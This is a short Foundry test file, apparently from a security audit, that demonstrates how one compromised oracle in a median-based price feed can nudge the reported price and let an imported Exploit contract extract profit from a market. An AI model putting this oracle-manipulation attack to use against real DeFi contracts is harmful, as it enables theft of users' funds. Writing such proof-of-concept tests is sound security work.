// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {
    DapiServer,
    AssetToken,
    OracleMarket,
    Exploit
} from "./17624-compromise-of-a-single-oracle-enables-limited-control-of-the.sol";

contract Api3SingleOracleTest is Test {
    function test_control_medianStartsAtHonestMiddle() public {
        DapiServer dapi = new DapiServer();
        assertEq(dapi.readData(), 600e18);
        dapi.setValue(2, 598e18);
        assertEq(dapi.readData(), 598e18);
        dapi.setValue(2, 603e18);
        assertEq(dapi.readData(), 603e18);
    }

    function test_singleCompromisedOracle_extractsMedianSpread() public {
        Exploit exploit = new Exploit();
        exploit.run{value: 2 ether}();

        // The 2 ETH call seeds 1 ETH of market liquidity and uses 1 ETH as
        // working capital; the oracle spread returns >1 ETH to Exploit.
        assertGt(address(exploit).balance, 1 ether);
        assertEq(exploit.oracle().readData(), 603e18);
        assertEq(exploit.token().balanceOf(address(exploit)), 0);
        assertGt(address(exploit.market()).balance, 0);
    }
}
